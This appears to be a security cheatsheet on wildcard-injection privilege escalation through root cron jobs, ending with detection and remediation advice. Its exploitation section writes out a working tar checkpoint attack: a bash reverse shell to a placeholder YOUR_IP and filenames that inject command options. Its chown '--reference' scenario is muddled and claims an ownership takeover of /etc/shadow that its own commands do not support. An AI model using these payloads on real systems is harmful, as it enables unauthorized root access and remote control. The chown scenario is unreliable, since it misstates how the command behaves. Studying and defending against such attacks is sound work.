## 📬 Cheatsheet: Wildcard Injection Privilege Escalation

A wildcard injection vulnerability occurs when a privileged process (like a root cron job) uses a command with a wildcard (`*`, `?`) to act on files within a user-writable directory. The shell expands the wildcard, and if an attacker creates filenames that start with a dash (`-`), the command may interpret these filenames as options instead of file paths. This can be abused to hijack the command's execution flow and run malicious code.

### ## What to Look For (Reconnaissance)

An attacker is looking for any script or cron job running as root that uses a wildcard on a directory they can write to.

* **Analyze Cron Jobs:** This is the most common vector. Look for commands that operate on user-controlled directories.
    ```bash
    cat /etc/crontab
    ls -l /etc/cron.d/
    ```
    **Vulnerable Example:** A cron job runs `tar czf /backups/archive.tgz /home/user/files/*`. The `/home/user/files/` directory is writable by `user`.

* **Monitor Processes:** Use a tool like **pspy** to watch for privileged processes being executed. You might see a script run that isn't obvious from the crontab.

* **Inspect Scripts:** Manually review any system scripts you can read that are likely to be run as root (e.g., backup scripts, cleanup scripts) and look for commands like `tar`, `chown`, `rsync`, or `chmod` used with a wildcard.

---

### ## Common Exploitable Scenarios & Payloads

The exploit depends on the command being used. The goal is to create filenames that match the command's options.

#### **Scenario 1: `tar` with Checkpoints (Most Common)**
The `tar` command has options (`--checkpoint` and `--checkpoint-action`) that can be abused to execute a command.

* **Vulnerable Command:** `* * * * * root cd /home/user/data && tar czf /backups/data.tgz *`
* **Exploitation:**
    1.  Navigate to the writable directory (`/home/user/data`).
    2.  Create a file containing your payload (e.g., a reverse shell).
        ```bash
        echo "bash -c 'bash -i >& /dev/tcp/YOUR_IP/4444 0>&1'" > shell.sh
        ```
    3.  Create two empty files whose names will be interpreted as command-line options.
        ```bash
        touch -- "--checkpoint=1"
        touch -- "--checkpoint-action=exec=bash shell.sh"
        ```
    4.  When the cron job runs `tar ... *`, the `*` expands to include these filenames. `tar` will execute `shell.sh` at its first checkpoint, giving you a root shell.

#### **Scenario 2: `chown` / `chgrp` with Reference**
The `chown` command has a `--reference` option to copy permissions from another file.

* **Vulnerable Command:** A script running `chown root:root *`.
* **Exploitation:** An attacker can't become root directly, but they can take ownership of a sensitive file. For example, they can use this to gain write access to `/etc/shadow` if they can make `chown` copy permissions from a file they own.
    ```bash
    # Create a file you own
    touch my_file
    # Create the malicious filename
    touch -- "--reference=my_file"
    # When 'chown root:root *' runs, it will also process '/etc/shadow' if it's in the same dir
    # and change its ownership to you instead of root.
    ```

---

### ## 🛡️ Detection & Remediation (For Defenders)

#### **How to Detect an Attempt**

* **Suspicious Filenames:** The presence of files named `--checkpoint=1` or other command-line options in user directories is a major indicator of an attempted exploit.
* **Process Auditing:** Monitor process execution. If a cron job is defined as `tar czf backup.tgz *`, but process logs show it running as `tar czf backup.tgz --checkpoint=1 ...`, it indicates a successful injection.

#### **How to Prevent Wildcard Injection**

* **Avoid Using Wildcards in Privileged Scripts:** This is the most robust defense. Instead of operating on a wildcard, explicitly find and loop through the files.
    ```bash
    # Bad:
    chown root:root /path/to/files/*

    # Good:
    find /path/to/files/ -type f -exec chown root:root {} \;
    ```

* **Use the `--` Argument:** The double-dash (`--`) is a standard shell convention that tells a command to stop processing options. Any argument after `--` is treated as a filename, even if it starts with a dash.
    ```bash
    # Bad:
    tar czf /backups/data.tgz *

    # Good:
    tar czf /backups/data.tgz -- *
    ```

* **Enforce Strict Permissions:** Do not run privileged commands that operate on directories where low-privilege users can create files. If a backup must be made, pull files from a location where users cannot control the filenames.
* **Regularly Audit Scripts:** Periodically review all scripts and cron jobs that run as root. Look for any use of wildcards and assess if they operate on a potentially controllable path.
